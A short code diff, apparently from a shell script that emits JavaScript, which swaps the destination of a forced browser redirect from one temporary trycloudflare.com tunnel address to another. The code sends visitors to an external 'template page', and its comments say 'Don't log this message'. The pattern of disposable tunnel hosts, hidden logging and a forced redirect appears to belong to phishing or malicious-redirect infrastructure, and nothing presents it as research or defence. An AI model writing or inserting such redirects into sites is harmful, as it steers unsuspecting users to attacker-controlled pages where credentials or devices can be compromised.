@@ -124,11 +124,11 @@ echo '
             // Don\'t log this message
             // Try to redirect to the template page
             try {
-                window.location.href = "https://joel-utils-kernel-plot.trycloudflare.com/index2.html";
+                window.location.href = "https://pins-console-networks-enhancing.trycloudflare.com/index2.html";
             } catch (e) {
                 // Don\'t log this message
                 // Fallback redirection
-                window.location = "https://joel-utils-kernel-plot.trycloudflare.com/index2.html";
+                window.location = "https://pins-console-networks-enhancing.trycloudflare.com/index2.html";
             }
         }
         
